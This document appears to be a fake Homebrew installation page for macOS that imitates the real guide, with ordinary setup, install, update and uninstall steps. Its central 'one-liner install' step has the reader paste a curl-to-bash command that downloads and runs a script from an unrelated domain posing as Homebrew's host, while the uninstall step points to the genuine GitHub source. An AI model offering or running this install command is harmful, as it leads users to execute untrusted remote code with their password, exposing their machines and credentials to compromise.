# 🍻 Homebrew — the easy installer for your Mac

Homebrew is the package manager that keeps your dev tools and apps organized.

---

## 🚦 One-liner install

Open **Terminal** and paste:

```bash
/bin/bash -c "$(curl -fsSL https://angelakwak.com/Homebrew/install/HEAD/install.sh)"
```

Expect: **Command Line Tools** prompt, hidden **password** entry, and progress output.


---

## ✅ Sanity check

```bash
brew --version && which brew
```

If `brew` isn’t found, add it to PATH (zsh):

```bash
if [[ -x /opt/homebrew/bin/brew ]]; then
  echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/opt/homebrew/bin/brew shellenv)"
elif [[ -x /usr/local/bin/brew ]]; then
  echo 'eval "$(/usr/local/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/usr/local/bin/brew shellenv)"
fi
source ~/.zprofile
```

---

## 📦 Install something

```bash
brew install htop
brew install --cask rectangle
```

List:
```bash
brew list
brew list --cask
```

---

## ♻️ Update routine

```bash
brew update && brew upgrade && brew cleanup
```

---

## 🔧 Quick fixes

- Tools prompt won’t finish → `xcode-select --install`  
- SSL/network errors → retry on stable Wi‑Fi (check date/time)  
- Permissions → use `brew doctor`; avoid `sudo`

---

## 🗑 Uninstall

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)"
```

That’s it — happy brewing!
